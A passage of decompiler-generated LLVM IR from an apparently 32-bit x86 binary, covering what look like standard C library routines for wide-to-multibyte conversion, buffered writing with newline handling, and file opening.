  store i32 %v1_804fad6, i32* %v2_804fad8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fadd

dec_label_pc_804fadd:                             ; preds = %dec_label_pc_804faa8, %dec_label_pc_804fad1
  %v0_804fadd = phi i32 [ %v6_804fac5, %dec_label_pc_804faa8 ], [ -1, %dec_label_pc_804fad1 ]
  %v2_804fae0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fae0, i32* @esi, align 4
  ret i32 %v0_804fadd

; uselistorder directives
  uselistorder i32 %v6_804fac5, { 1, 0, 2 }
  uselistorder i32 %v0_804fabd, { 1, 0 }
  uselistorder label %dec_label_pc_804fadd, { 1, 0 }
}

define i32 @function_804fae4() local_unnamed_addr {
dec_label_pc_804fae4:
  ret i32 ptrtoint (i32* @global_var_8058764.185 to i32)
}

define i32 @function_804faec() local_unnamed_addr {
dec_label_pc_804faec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804faf7 = icmp eq i32 %tmp5, 0
  %v1_804faf9 = icmp eq i1 %v1_804faf7, false
  br i1 %v1_804faf9, label %dec_label_pc_804fb01, label %dec_label_pc_804fafb

dec_label_pc_804fafb:                             ; preds = %dec_label_pc_804faec
  %v2_804fafb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804fb01

dec_label_pc_804fb01:                             ; preds = %dec_label_pc_804faec, %dec_label_pc_804fafb
  %v0_804fb1d = phi i32 [ %tmp5, %dec_label_pc_804faec ], [ %v2_804fafb, %dec_label_pc_804fafb ]
  %v0_804fb05 = phi i32 [ %tmp4, %dec_label_pc_804faec ], [ 0, %dec_label_pc_804fafb ]
  %v2_804fb01 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_804fb05, i32* %stack_var_-4, align 4
  store i32 %v2_804fb01, i32* %stack_var_-8, align 4
  %v2_804fb18 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804fb1e = inttoptr i32 %v0_804fb1d to i8*
  %v6_804fb1e = call i32 @function_804fb50(i8* %v5_804fb1e, i32 %v2_804fb18, i32 1, i32 16, i32 %tmp)
  %v1_804fb26 = icmp eq i32 %v6_804fb1e, 0
  %v1_804fb28 = icmp eq i1 %v1_804fb26, false
  br i1 %v1_804fb28, label %dec_label_pc_804fb2c, label %dec_label_pc_804fb2a

dec_label_pc_804fb2a:                             ; preds = %dec_label_pc_804fb01
  %v1_804fb2a = and i32 %v6_804fb1e, -256
  %v2_804fb2a = or i32 %v1_804fb2a, 1
  br label %dec_label_pc_804fb2c

dec_label_pc_804fb2c:                             ; preds = %dec_label_pc_804fb01, %dec_label_pc_804fb2a
  %v0_804fb2f = phi i32 [ %v6_804fb1e, %dec_label_pc_804fb01 ], [ %v2_804fb2a, %dec_label_pc_804fb2a ]
  ret i32 %v0_804fb2f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804fb2c, { 1, 0 }
  uselistorder label %dec_label_pc_804fb01, { 1, 0 }
}

define i32 @function_804fb30() local_unnamed_addr {
dec_label_pc_804fb30:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804fb45 = inttoptr i32 %tmp to i8*
  %v6_804fb45 = call i32 @function_804fb50(i8* %v5_804fb45, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804fb45
}

define i32 @function_804fb50(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804fb50:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804fb53 = load i32, i32* @ebx, align 4
  %v4_804fb57 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb57, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804fb63 = icmp eq i8* %arg1, null
  br i1 %v1_804fb63, label %dec_label_pc_804fb97.thread, label %dec_label_pc_804fb67

dec_label_pc_804fb67:                             ; preds = %dec_label_pc_804fb50
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804fb6c = icmp eq i32 %v4_804fb57, %arg2
  %v1_804fb6e = icmp eq i1 %v12_804fb6c, false
  br i1 %v1_804fb6e, label %dec_label_pc_804fb97, label %dec_label_pc_804fb91

dec_label_pc_804fb97.thread:                      ; preds = %dec_label_pc_804fb50
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804fb74 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fb74, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fba1

dec_label_pc_804fb7d:                             ; preds = %dec_label_pc_804fba8
  %v1_804fb7d = call i32 @function_804b774(i32 %v0_804fb53)
  store i32 %v1_804fb7d, i32* %eax.global-to-local, align 4
  %v1_804fb82 = inttoptr i32 %v1_804fb7d to i32*
  store i32 84, i32* %v1_804fb82, align 4
  br label %dec_label_pc_804fbce

dec_label_pc_804fb8d:                             ; preds = %dec_label_pc_804fbaf
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804fbc3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fbbf

dec_label_pc_804fb91:                             ; preds = %dec_label_pc_804fb67
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804fb93 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fb93, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fb97

dec_label_pc_804fb97:                             ; preds = %dec_label_pc_804fb67, %dec_label_pc_804fb91
  %v2_804fbaf15 = phi i32 [ %v4_804fb57, %dec_label_pc_804fb67 ], [ %v2_804fb93, %dec_label_pc_804fb91 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_804fb9f, label %dec_label_pc_804fba1

dec_label_pc_804fb9f:                             ; preds = %dec_label_pc_804fb97
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fba1

dec_label_pc_804fba1:                             ; preds = %dec_label_pc_804fb97.thread, %dec_label_pc_804fb97, %dec_label_pc_804fb9f
  %v2_804fbaf1532 = phi i32 [ %v2_804fbaf15, %dec_label_pc_804fb97 ], [ %v2_804fbaf15, %dec_label_pc_804fb9f ], [ %v2_804fb74, %dec_label_pc_804fb97.thread ]
  %v0_804fba4 = phi i32 [ %arg3, %dec_label_pc_804fb97 ], [ %arg4, %dec_label_pc_804fb9f ], [ %arg3, %dec_label_pc_804fb97.thread ]
  %v1_804fba1 = inttoptr i32 %arg2 to i32*
  %v2_804fba1 = load i32, i32* %v1_804fba1, align 4
  store i32 %v2_804fba1, i32* %esi.global-to-local, align 4
  store i32 %v0_804fba4, i32* @ecx, align 4
  %v1_804fbbb3 = icmp eq i32 %v0_804fba4, 0
  %v1_804fbbd10 = icmp eq i1 %v1_804fbbb3, false
  br i1 %v1_804fbbd10, label %dec_label_pc_804fba8, label %dec_label_pc_804fbbf

dec_label_pc_804fba8:                             ; preds = %dec_label_pc_804fba1, %dec_label_pc_804fbb5
  %v2_804fbaf = phi i32 [ %v2_804fbb8, %dec_label_pc_804fbb5 ], [ %v2_804fbaf1532, %dec_label_pc_804fba1 ]
  %v0_804fba8 = phi i32 [ %v1_804fbb5, %dec_label_pc_804fbb5 ], [ %v2_804fba1, %dec_label_pc_804fba1 ]
  %v1_804fba8 = inttoptr i32 %v0_804fba8 to i32*
  %v2_804fba8 = load i32, i32* %v1_804fba8, align 4
  store i32 %v2_804fba8, i32* %eax.global-to-local, align 4
  %v6_804fbad = icmp ugt i32 %v2_804fba8, 127
  br i1 %v6_804fbad, label %dec_label_pc_804fb7d, label %dec_label_pc_804fbaf

dec_label_pc_804fbaf:                             ; preds = %dec_label_pc_804fba8
  %v1_804fbaf = trunc i32 %v2_804fba8 to i8
  %v3_804fbaf = inttoptr i32 %v2_804fbaf to i8*
  store i8 %v1_804fbaf, i8* %v3_804fbaf, align 1
  %v0_804fbb1 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fbb1 = trunc i32 %v0_804fbb1 to i8
  %v4_804fbb1 = icmp eq i8 %v3_804fbb1, 0
  br i1 %v4_804fbb1, label %dec_label_pc_804fb8d, label %dec_label_pc_804fbb5

dec_label_pc_804fbb5:                             ; preds = %dec_label_pc_804fbaf
  %v0_804fbb5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fbb5 = add i32 %v0_804fbb5, 4
  store i32 %v1_804fbb5, i32* %esi.global-to-local, align 4
  %v0_804fbb8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fbb8 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fbb8 = add i32 %v1_804fbb8, %v0_804fbb8
  store i32 %v2_804fbb8, i32* %edx.global-to-local, align 4
  %v0_804fbba = load i32, i32* @ecx, align 4
  %v1_804fbba = add i32 %v0_804fbba, -1
  %v8_804fbba = icmp eq i32 %v1_804fbba, 0
  store i32 %v1_804fbba, i32* @ecx, align 4
  %v1_804fbbd = icmp eq i1 %v8_804fbba, false
  br i1 %v1_804fbbd, label %dec_label_pc_804fba8, label %dec_label_pc_804fbbf

dec_label_pc_804fbbf:                             ; preds = %dec_label_pc_804fbb5, %dec_label_pc_804fba1, %dec_label_pc_804fb8d
  %v0_804fbc7 = phi i32 [ 0, %dec_label_pc_804fb8d ], [ %v2_804fba1, %dec_label_pc_804fba1 ], [ %v1_804fbb5, %dec_label_pc_804fbb5 ]
  %v0_804fbc3 = phi i32 [ %v0_804fbc3.pre, %dec_label_pc_804fb8d ], [ %v2_804fbaf1532, %dec_label_pc_804fba1 ], [ %v2_804fbb8, %dec_label_pc_804fbb5 ]
  %v2_804fbbf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fbbf, i32* %eax.global-to-local, align 4
  %v12_804fbc3 = icmp eq i32 %v0_804fbc3, %v2_804fbbf
  br i1 %v12_804fbc3, label %dec_label_pc_804fbca, label %dec_label_pc_804fbc7

dec_label_pc_804fbc7:                             ; preds = %dec_label_pc_804fbbf
  %v1_804fbc7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804fbc7 = inttoptr i32 %v1_804fbc7 to i32*
  store i32 %v0_804fbc7, i32* %v2_804fbc7, align 4
  br label %dec_label_pc_804fbca

dec_label_pc_804fbca:                             ; preds = %dec_label_pc_804fbbf, %dec_label_pc_804fbc7
  %v0_804fbca = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fbca, i32* %eax.global-to-local, align 4
  %v1_804fbcc = load i32, i32* @ecx, align 4
  %v2_804fbcc = sub i32 %v0_804fbca, %v1_804fbcc
  br label %dec_label_pc_804fbce

dec_label_pc_804fbce:                             ; preds = %dec_label_pc_804fb7d, %dec_label_pc_804fbca
  %storemerge1 = phi i32 [ %v2_804fbcc, %dec_label_pc_804fbca ], [ -1, %dec_label_pc_804fb7d ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_804fb53, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_804fbb8, { 0, 2, 1 }
  uselistorder i32 %v1_804fbb5, { 0, 2, 1 }
  uselistorder i32 %v2_804fba1, { 1, 0, 2 }
  uselistorder i32 %v0_804fba4, { 1, 0 }
  uselistorder i32 %v2_804fbaf1532, { 1, 0 }
  uselistorder i32 %v4_804fb57, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 5, 2, 6, 3, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fbce, { 1, 0 }
  uselistorder label %dec_label_pc_804fbca, { 1, 0 }
  uselistorder label %dec_label_pc_804fba8, { 1, 0 }
  uselistorder label %dec_label_pc_804fba1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fb97, { 1, 0 }
}

define i32 @function_804fbd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fbd8:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804fbe3 = call i32 @function_804f62c(i32 %arg1, i32 3, i32 %tmp11, i32 %tmp7)
  store i32 %v4_804fbe3, i32* @eax, align 4
  %v10_804fbed = icmp eq i32 %v4_804fbe3, -1
  br i1 %v10_804fbed, label %dec_label_pc_804fc04, label %dec_label_pc_804fbf2

dec_label_pc_804fbf2:                             ; preds = %dec_label_pc_804fbd8
  %v0_804fbf2 = load i32, i32* @ebx, align 4
  %v4_804fbfa = inttoptr i32 %arg2 to i8*
  %v5_804fbfa = call i32 @function_804bc48(i32 %v4_804fbe3, i8* %v4_804fbfa, i32 0, i32 %v0_804fbf2)
  br label %dec_label_pc_804fc04

dec_label_pc_804fc04:                             ; preds = %dec_label_pc_804fbd8, %dec_label_pc_804fbf2
  %v0_804fc04 = phi i32 [ 0, %dec_label_pc_804fbd8 ], [ %v5_804fbfa, %dec_label_pc_804fbf2 ]
  %v2_804fc08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc08, i32* @ebx, align 4
  ret i32 %v0_804fc04

; uselistorder directives
  uselistorder i32 %v4_804fbe3, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f62c, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fc04, { 1, 0 }
}

define i32 @function_804fc0c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fc0c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804fc0d = load i32, i32* @edi, align 4
  %v0_804fc0f = load i32, i32* @ebx, align 4
  %v4_804fc13 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fc13, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804fc1f4 = icmp eq i32 %arg3, 0
  br i1 %v1_804fc1f4, label %dec_label_pc_804fc7e, label %dec_label_pc_804fc24.lr.ph

dec_label_pc_804fc24.lr.ph:                       ; preds = %dec_label_pc_804fc0c
  br label %dec_label_pc_804fc24

dec_label_pc_804fc24:                             ; preds = %dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge, %dec_label_pc_804fc24.lr.ph
  %v0_804fc34 = phi i32 [ %v4_804fc13, %dec_label_pc_804fc24.lr.ph ], [ %v0_804fc34.pre, %dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge ]
  %v0_804fc33 = phi i32 [ %arg2, %dec_label_pc_804fc24.lr.ph ], [ %v2_804fc45, %dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge ]
  %v0_804fc26.in = phi i32 [ %arg3, %dec_label_pc_804fc24.lr.ph ], [ %v2_804fc43, %dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge ]
  %v0_804fc26 = icmp slt i32 %v0_804fc26.in, 0
  store i32 %v0_804fc26.in, i32* %ebp.global-to-local, align 4
  %v2_804fc26 = icmp eq i1 %v0_804fc26, false
  %storemerge = select i1 %v2_804fc26, i32 %v0_804fc26.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804fc34 = add i32 %v0_804fc34, 4
  %v2_804fc34 = inttoptr i32 %v1_804fc34 to i32*
  %v3_804fc34 = load i32, i32* %v2_804fc34, align 4
  %tmp36 = inttoptr i32 %v0_804fc33 to i32*
  %v5_804fc37 = call i32 @function_804b71c(i32 %v3_804fc34, i32* %tmp36, i32 %storemerge)
  store i32 %v5_804fc37, i32* %eax.global-to-local, align 4
  %v2_804fc3f = icmp slt i32 %v5_804fc37, 0
  br i1 %v2_804fc3f, label %dec_label_pc_804fc49, label %dec_label_pc_804fc43

dec_label_pc_804fc43:                             ; preds = %dec_label_pc_804fc24
  %v0_804fc43 = load i32, i32* @ebx, align 4
  %v2_804fc43 = sub i32 %v0_804fc43, %v5_804fc37
  %v12_804fc43 = icmp eq i32 %v2_804fc43, 0
  store i32 %v2_804fc43, i32* @ebx, align 4
  %v0_804fc45 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fc45 = add i32 %v0_804fc45, %v5_804fc37
  store i32 %v2_804fc45, i32* %esi.global-to-local, align 4
  br i1 %v12_804fc43, label %dec_label_pc_804fc7e, label %dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge

dec_label_pc_804fc43.dec_label_pc_804fc24_crit_edge: ; preds = %dec_label_pc_804fc43
  %v0_804fc34.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fc24

dec_label_pc_804fc49:                             ; preds = %dec_label_pc_804fc24
  %v0_804fc49 = load i32, i32* @edi, align 4
  %v1_804fc49 = add i32 %v0_804fc49, 8
  %v2_804fc49 = inttoptr i32 %v1_804fc49 to i32*
  %v3_804fc49 = load i32, i32* %v2_804fc49, align 4
  store i32 %v3_804fc49, i32* @edx, align 4
  %v1_804fc4c = add i32 %v0_804fc49, 12
  %v2_804fc4c = inttoptr i32 %v1_804fc4c to i32*
  %v3_804fc4c = load i32, i32* %v2_804fc4c, align 4
  store i32 %v3_804fc4c, i32* %eax.global-to-local, align 4
  %v1_804fc4f = inttoptr i32 %v0_804fc49 to i16*
  %v2_804fc4f = load i16, i16* %v1_804fc4f, align 2
  %v3_804fc4f = or i16 %v2_804fc4f, 8
  store i16 %v3_804fc4f, i16* %v1_804fc4f, align 2
  %v0_804fc53 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc53 = load i32, i32* @edx, align 4
  %v2_804fc53 = sub i32 %v0_804fc53, %v1_804fc53
  %v12_804fc53 = icmp eq i32 %v2_804fc53, 0
  store i32 %v2_804fc53, i32* %eax.global-to-local, align 4
  %v4_804fc7a.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804fc53, label %dec_label_pc_804fc7a, label %dec_label_pc_804fc57

dec_label_pc_804fc57:                             ; preds = %dec_label_pc_804fc49
  %v6_804fc59 = icmp ugt i32 %v2_804fc53, %v4_804fc7a.pre
  br i1 %v6_804fc59, label %dec_label_pc_804fc5d.preheader, label %dec_label_pc_804fc5b

dec_label_pc_804fc5b:                             ; preds = %dec_label_pc_804fc57
  store i32 %v2_804fc53, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804fc5d.preheader

dec_label_pc_804fc5d.preheader:                   ; preds = %dec_label_pc_804fc5b, %dec_label_pc_804fc57
  %v0_804fc5d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc5d

dec_label_pc_804fc5d:                             ; preds = %dec_label_pc_804fc5d.preheader, %dec_label_pc_804fc6f
  %v2_804fc5f = phi i32 [ %v1_804fc53, %dec_label_pc_804fc5d.preheader ], [ %v1_804fc6b, %dec_label_pc_804fc6f ]
  %v4_804fc5d = phi i32 [ %v2_804fc53, %dec_label_pc_804fc5d.preheader ], [ %v0_804fc61, %dec_label_pc_804fc6f ]
  %v0_804fc5d = phi i32 [ %v0_804fc5d.pre, %dec_label_pc_804fc5d.preheader ], [ %v1_804fc6f, %dec_label_pc_804fc6f ]
  %v1_804fc5d = inttoptr i32 %v0_804fc5d to i8*
  %v2_804fc5d = load i8, i8* %v1_804fc5d, align 1
  %v3_804fc5d = zext i8 %v2_804fc5d to i32
  %v5_804fc5d = and i32 %v4_804fc5d, -256
  %v6_804fc5d = or i32 %v3_804fc5d, %v5_804fc5d
  store i32 %v6_804fc5d, i32* %eax.global-to-local, align 4
  %v3_804fc5f = inttoptr i32 %v2_804fc5f to i8*
  store i8 %v2_804fc5d, i8* %v3_804fc5f, align 1
  %v0_804fc61 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc61 = trunc i32 %v0_804fc61 to i8
  %v10_804fc61 = icmp eq i8 %v1_804fc61, 10
  %v1_804fc63 = icmp eq i1 %v10_804fc61, false
  br i1 %v1_804fc63, label %dec_label_pc_804fc6b, label %dec_label_pc_804fc65

dec_label_pc_804fc65:                             ; preds = %dec_label_pc_804fc5d
  %v0_804fc65 = load i32, i32* @edi, align 4
  %v1_804fc65 = add i32 %v0_804fc65, 1
  %v2_804fc65 = inttoptr i32 %v1_804fc65 to i8*
  %v3_804fc65 = load i8, i8* %v2_804fc65, align 1
  %v4_804fc65 = urem i8 %v3_804fc65, 2
  %v5_804fc65 = icmp eq i8 %v4_804fc65, 0
  %v1_804fc69 = icmp eq i1 %v5_804fc65, false
  br i1 %v1_804fc69, label %dec_label_pc_804fc65.dec_label_pc_804fc72_crit_edge, label %dec_label_pc_804fc6b

dec_label_pc_804fc65.dec_label_pc_804fc72_crit_edge: ; preds = %dec_label_pc_804fc65
  %v0_804fc72.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fc72

dec_label_pc_804fc6b:                             ; preds = %dec_label_pc_804fc65, %dec_label_pc_804fc5d
  %v0_804fc6b = load i32, i32* @edx, align 4
  %v1_804fc6b = add i32 %v0_804fc6b, 1
  store i32 %v1_804fc6b, i32* @edx, align 4
  %v0_804fc6c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fc6c = add i32 %v0_804fc6c, -1
  %v8_804fc6c = icmp eq i32 %v1_804fc6c, 0
  store i32 %v1_804fc6c, i32* %ebp.global-to-local, align 4
  br i1 %v8_804fc6c, label %dec_label_pc_804fc6b.dec_label_pc_804fc72_crit_edge, label %dec_label_pc_804fc6f

dec_label_pc_804fc6b.dec_label_pc_804fc72_crit_edge: ; preds = %dec_label_pc_804fc6b
  %v1_804fc72.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fc72

dec_label_pc_804fc6f:                             ; preds = %dec_label_pc_804fc6b
  %v0_804fc6f = load i32, i32* %esi.global-to-local, align 4
  %v1_804fc6f = add i32 %v0_804fc6f, 1
  store i32 %v1_804fc6f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc5d

dec_label_pc_804fc72:                             ; preds = %dec_label_pc_804fc6b.dec_label_pc_804fc72_crit_edge, %dec_label_pc_804fc65.dec_label_pc_804fc72_crit_edge
  %v1_804fc72 = phi i32 [ %v0_804fc65, %dec_label_pc_804fc65.dec_label_pc_804fc72_crit_edge ], [ %v1_804fc72.pre, %dec_label_pc_804fc6b.dec_label_pc_804fc72_crit_edge ]
  %v0_804fc72 = phi i32 [ %v0_804fc72.pre, %dec_label_pc_804fc65.dec_label_pc_804fc72_crit_edge ], [ %v1_804fc6b, %dec_label_pc_804fc6b.dec_label_pc_804fc72_crit_edge ]
  %v2_804fc72 = add i32 %v1_804fc72, 16
  %v3_804fc72 = inttoptr i32 %v2_804fc72 to i32*
  store i32 %v0_804fc72, i32* %v3_804fc72, align 4
  %v0_804fc75 = load i32, i32* @edx, align 4
  %v1_804fc75 = load i32, i32* @edi, align 4
  %v2_804fc75 = add i32 %v1_804fc75, 8
  %v3_804fc75 = inttoptr i32 %v2_804fc75 to i32*
  %v4_804fc75 = load i32, i32* %v3_804fc75, align 4
  %v5_804fc75 = sub i32 %v0_804fc75, %v4_804fc75
  store i32 %v5_804fc75, i32* @edx, align 4
  %v0_804fc78 = load i32, i32* @ebx, align 4
  %v2_804fc78 = sub i32 %v0_804fc78, %v5_804fc75
  br label %dec_label_pc_804fc7a

dec_label_pc_804fc7a:                             ; preds = %dec_label_pc_804fc49, %dec_label_pc_804fc72
  %v4_804fc7a = phi i32 [ %v2_804fc78, %dec_label_pc_804fc72 ], [ %v4_804fc7a.pre, %dec_label_pc_804fc49 ]
  %v5_804fc7a = sub i32 %arg3, %v4_804fc7a
  br label %dec_label_pc_804fc7e

dec_label_pc_804fc7e:                             ; preds = %dec_label_pc_804fc43, %dec_label_pc_804fc0c, %dec_label_pc_804fc7a
  %stack_var_12.0 = phi i32 [ %v5_804fc7a, %dec_label_pc_804fc7a ], [ 0, %dec_label_pc_804fc0c ], [ %arg3, %dec_label_pc_804fc43 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_804fc0f, i32* @ebx, align 4
  store i32 %v0_804fc0d, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804fc6f, { 1, 0 }
  uselistorder i32 %v1_804fc6c, { 1, 0 }
  uselistorder i32 %v1_804fc6b, { 0, 2, 1 }
  uselistorder i32 %v0_804fc61, { 1, 0 }
  uselistorder i32 %v2_804fc45, { 1, 0 }
  uselistorder i32 %v2_804fc43, { 1, 2, 0 }
  uselistorder i32 %v5_804fc37, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @function_804b71c, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804fc7e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fc7a, { 1, 0 }
  uselistorder label %dec_label_pc_804fc5d, { 1, 0 }
}

define i32 @function_804fc8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fc8c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fc8c = load i32, i32* @ebp, align 4
  %v0_804fc8d = load i32, i32* @edi, align 4
  %v0_804fc8e = load i32, i32* @esi, align 4
  %v0_804fc8f = load i32, i32* @ebx, align 4
  store i32 %v0_804fc8f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804fc9f = add i32 %arg3, 1
  %v2_804fc9f = inttoptr i32 %v1_804fc9f to i8*
  %v3_804fc9f = load i8, i8* %v2_804fc9f, align 1
  %v4_804fc9f = and i8 %v3_804fc9f, 2
  %v5_804fc9f = icmp eq i8 %v4_804fc9f, 0
  %v1_804fca3 = icmp eq i1 %v5_804fc9f, false
  br i1 %v1_804fca3, label %dec_label_pc_804fd5a, label %dec_label_pc_804fca9

dec_label_pc_804fca9:                             ; preds = %dec_label_pc_804fc8c
  %v1_804fca9 = add i32 %arg3, 4
  %v2_804fca9 = inttoptr i32 %v1_804fca9 to i32*
  %v3_804fca9 = load i32, i32* %v2_804fca9, align 4
  %v13_804fca9 = icmp eq i32 %v3_804fca9, -2
  %v1_804fcad = add i32 %arg3, 16
  %v2_804fcad = inttoptr i32 %v1_804fcad to i32*
  %v3_804fcad = load i32, i32* %v2_804fcad, align 4
  store i32 %v3_804fcad, i32* @edx, align 4
  %v1_804fcb0 = add i32 %arg3, 12
  %v2_804fcb0 = inttoptr i32 %v1_804fcb0 to i32*
  %v3_804fcb0 = load i32, i32* %v2_804fcb0, align 4
  %v1_804fcb3 = icmp eq i1 %v13_804fca9, false
  %v2_804fcd3 = sub i32 %v3_804fcb0, %v3_804fcad
  store i32 %v2_804fcd3, i32* %eax.global-to-local, align 4
  br i1 %v1_804fcb3, label %dec_label_pc_804fcd3, label %dec_label_pc_804fcb5

dec_label_pc_804fcb5:                             ; preds = %dec_label_pc_804fca9
  %tmp22 = icmp ult i32 %v2_804fcd3, %arg2
  br i1 %tmp22, label %dec_label_pc_804fcbd, label %dec_label_pc_804fcbf

dec_label_pc_804fcbd:                             ; preds = %dec_label_pc_804fcb5
  br label %dec_label_pc_804fcbf

dec_label_pc_804fcbf:                             ; preds = %dec_label_pc_804fcb5, %dec_label_pc_804fcbd
  %storemerge = phi i32 [ %v2_804fcd3, %dec_label_pc_804fcbd ], [ %arg2, %dec_label_pc_804fcb5 ]
  %v0_804fcc0 = phi i32 [ %v2_804fcd3, %dec_label_pc_804fcbd ], [ %arg2, %dec_label_pc_804fcb5 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804fcc3 = inttoptr i32 %v3_804fcad to i16*
  %v4_804fcc3 = call i32 @function_804d150(i16* %v3_804fcc3, i32 %v0_804fcc0, i32 %v2_804fcd3)
  store i32 %v4_804fcc3, i32* %eax.global-to-local, align 4
